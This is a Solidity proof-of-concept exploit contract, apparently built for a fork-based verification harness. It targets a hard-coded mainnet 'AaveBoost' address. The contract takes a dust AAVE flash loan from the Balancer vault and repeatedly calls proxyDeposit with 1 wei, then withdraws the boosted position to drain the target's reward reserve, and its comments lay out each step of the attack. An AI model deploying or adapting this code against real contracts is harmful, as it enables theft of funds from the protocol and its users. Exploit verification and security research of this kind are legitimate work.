// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAaveBoostLike {
    function aave() external view returns (address);
    function pool() external view returns (address);
    function REWARD() external view returns (uint128);
    function proxyDeposit(address asset, address recipient, uint128 amount) external;
}

interface IAavePoolLike {
    function withdraw(address asset, address recipient, uint128 amount, bool claim) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address internal constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    uint128 internal constant DUST_AMOUNT = 1;

    // Keep the reported profit token stable before and after execution so the
    // harness can measure the verifier's realized AAVE balance delta.
    address internal _profitToken = AAVE;
    uint256 internal _profitAmount;
    bool internal _executing;

    constructor() {}

    function executeOnOpportunity() external {
        IAaveBoostLike boost = IAaveBoostLike(TARGET);
        address tokenAddress = boost.aave();
        uint256 reward = uint256(boost.REWARD());

        _profitToken = tokenAddress;
        _profitAmount = 0;

        // If the target has no configured subsidy or is not currently funded,
        // the stated exploit path cannot start on this fork.
        if (reward == 0) {
            return;
        }

        IERC20Like token = IERC20Like(tokenAddress);
        uint256 boostBalance = token.balanceOf(TARGET);
        if (boostBalance < reward) {
            return;
        }

        uint256 beforeBalance = token.balanceOf(address(this));
        uint256 requiredDust = uint256(DUST_AMOUNT);

        if (beforeBalance >= requiredDust) {
            _drainRewards(token, boost, boostBalance, reward);
        } else {
            IERC20Like[] memory tokens = new IERC20Like[](1);
            tokens[0] = token;

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = requiredDust;

            // The exploit only needs transient access to a dust amount of AAVE.
            // A public flash loan is a realistic way to source that dust without
            // privileged balance injection and preserves the same exploit causality:
            // funded reward reserve -> repeated dust proxyDeposit calls -> boosted
            // withdrawals back to the attacker.
            IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
        }

        uint256 afterBalance = token.balanceOf(address(this));
        if (afterBalance > beforeBalance) {
            _profitAmount = afterBalance - beforeBalance;
        }
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not-vault");
        require(!_executing, "reentered");

        _executing = true;

        IERC20Like token = tokens[0];
        uint256 amount = amounts[0];
        uint256 fee = feeAmounts[0];

        IAaveBoostLike boost = IAaveBoostLike(TARGET);
        uint256 reward = uint256(boost.REWARD());
        uint256 boostBalance = token.balanceOf(TARGET);
        if (reward != 0 && boostBalance >= reward) {
            _drainRewards(token, boost, boostBalance, reward);
        }

        require(token.transfer(BALANCER_VAULT, amount + fee), "repay-failed");
        _executing = false;
    }

    function _drainRewards(
        IERC20Like token,
        IAaveBoostLike boost,
        uint256 startingBoostBalance,
        uint256 reward
    ) internal {
        require(!_executing || msg.sender == BALANCER_VAULT, "bad-context");

        IAavePoolLike pool = IAavePoolLike(boost.pool());
        require(token.approve(TARGET, type(uint256).max), "approve-failed");

        // Path-aligned execution:
        // 1) AaveBoost already holds enough AAVE to pay fixed rewards.
        // 2) The attacker repeatedly calls proxyDeposit(aave, attacker, 1).
        // 3) Each call only pulls the 1-wei dust amount from the attacker, while
        //    AaveBoost deposits dust + REWARD for the attacker.
        // 4) The attacker immediately withdraws that boosted pool position.
        // 5) Repeat until AaveBoost's AAVE balance falls below REWARD.
        //
        // Each successful round reduces AaveBoost's own AAVE balance by exactly
        // REWARD, because the dust amount is transferred in and then included in
        // the pool deposit that is later withdrawn by the attacker.
        uint256 rounds = startingBoostBalance / reward;
        uint256 withdrawAmount256 = reward + uint256(DUST_AMOUNT);
        require(withdrawAmount256 <= type(uint128).max, "withdraw-too-large");
        uint128 withdrawAmount = uint128(withdrawAmount256);

        for (uint256 index = 0; index < rounds; ++index) {
            boost.proxyDeposit(address(token), address(this), DUST_AMOUNT);
            pool.withdraw(address(token), address(this), withdrawAmount, false);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
